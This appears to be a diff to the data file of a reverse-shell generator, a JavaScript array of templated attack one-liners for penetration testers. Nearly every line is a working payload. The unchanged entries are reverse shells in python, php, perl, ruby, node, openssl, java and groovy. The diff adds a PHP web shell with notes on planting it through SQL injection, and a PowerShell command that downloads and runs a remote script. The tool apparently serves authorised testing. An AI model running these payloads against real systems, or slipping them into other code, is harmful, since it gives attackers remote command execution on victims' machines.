@@ -58,6 +58,7 @@ window.REVSHELLS = [
   { lang: "python",     name: "python3 short",  cmd: `export RHOST="{tester_ip}";export RPORT={tester_port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` },
   { lang: "php",        name: "php exec",        cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
   { lang: "php",        name: "php system",      cmd: `php -r '$sock=fsockopen("{tester_ip}",{tester_port});system("/bin/sh -i <&3 >&3 2>&3");'` },
+  { lang: "php",        name: "php webshell (cmd param)", cmd: `<?php passthru($_GET['cmd']); ?>   // drop as s.php, then: curl '{target_url}/s.php?cmd=id'  ·  SQLi-embedded (INTO OUTFILE / PG copy): double the quotes -> <?php passthru($_GET[''cmd'']); ?>` },
   { lang: "perl",       name: "perl",            cmd: `perl -e 'use Socket;$i="{tester_ip}";$p={tester_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
   { lang: "ruby",       name: "ruby",            cmd: `ruby -rsocket -e'f=TCPSocket.open("{tester_ip}",{tester_port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
   { lang: "node",       name: "node.js",         cmd: `node -e 'sh=require("child_process").spawn("/bin/sh");net=require("net");c=new net.Socket();c.connect({tester_port},"{tester_ip}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'` },
@@ -73,7 +74,8 @@ window.REVSHELLS = [
   { lang: "openssl",    name: "openssl (TLS)",   cmd: `mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {tester_ip}:{tester_port} >/tmp/s;rm /tmp/s` },
   { lang: "java",       name: "java Runtime",    cmd: `r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{tester_ip}/{tester_port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()` },
   { lang: "groovy",     name: "groovy",          cmd: `String host="{tester_ip}";int port={tester_port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
-  { lang: "powershell", name: "powershell b64",  cmd: `powershell -nop -w hidden -e <BASE64>   # generate: $c='<PS #1 oneliner>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))` }
+  { lang: "powershell", name: "powershell b64",  cmd: `powershell -nop -w hidden -e <BASE64>   # generate: $c='<PS #1 oneliner>'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))` },
+  { lang: "powershell", name: "powershell download-exec", cmd: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{tester_ip}:{tester_port}/s.ps1')"   # Windows web RCE: host s.ps1 (a TCP revshell, e.g. powershell #1) and run this from the injection` }
 ];
 
 /* Setup tab — tooling install commands (static, not templated). */
